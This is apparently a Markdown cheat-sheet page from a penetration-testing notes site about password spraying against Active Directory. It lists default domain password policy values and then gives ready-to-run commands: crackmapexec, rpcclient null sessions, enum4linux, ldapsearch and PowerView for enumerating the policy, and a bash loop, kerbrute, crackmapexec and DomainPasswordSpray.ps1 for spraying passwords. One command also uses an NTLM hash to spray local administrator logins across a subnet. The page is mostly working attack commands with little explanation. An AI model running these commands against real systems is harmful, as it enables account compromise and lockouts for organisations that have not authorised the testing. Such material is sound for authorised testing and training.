---
title: "Password Spraying"
Description: 
draft: false
images: []
menu:
  docs:
    parent: "Active Directory"
weight: 3
toc: true
---
## <span style="color:#208355"> Password Policy

The default password policy when a new domain is created is as follows, and there have been plenty of organizations that never changed this policy:

|     Policy     |      Default Value         |
|:----------|:-------------|
|Enforce password history| 	24 days|
|Maximum password age|	42 days|
|Minimum password age|	1 day|
|Minimum password length|	7|
|Password must meet complexity requirements|	Enabled|
|Store passwords using reversible encryption|	Disabled|
|Account lockout duration|	Not set|
|Account lockout threshold|	0|
|Reset account lockout counter after|	Not set|

### <span style="color:#208355"> Enumerating the Password Policy - from Linux

```
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
```python
rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo
rpcclient $> getdompwinfo
```
```
enum4linux -P 172.16.5.5
```
```
enum4linux-ng -P 172.16.5.5 -oA enum4linuxOutput
```
```python
ldapsearch -h 172.16.5.5 -x -b "DC=EXAMPLE,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
### <span style="color:#208355"> Enumerating the Password Policy - from Windows
```
C:\kryot> net accounts
```
```python
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
```
## <span style="color:#208355"> Password Spraying

### <span style="color:#208355"> Internal Password Spraying - from Linux

Bash oneliner
```powershell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
Kerbrute
```
kerbrute passwordspray -d example.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
Crackmapexec
```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
Local Admin Spraying with CrackMapExec

```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

### <span style="color:#208355"> Internal Password Spraying - from Windows
<span style="color:#208355"><a href="https://github.com/dafthack/DomainPasswordSpray" target="_blank">DomainPasswordSpray.ps1</a></span>

```
PS C:\kryot> Import-Module .\DomainPasswordSpray.ps1
PS C:\kryot> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

Kerbrute.exe
```
kerbrute.exe passwordspray -d example.local --dc 172.16.5.5 valid_users.txt  Welcome1
```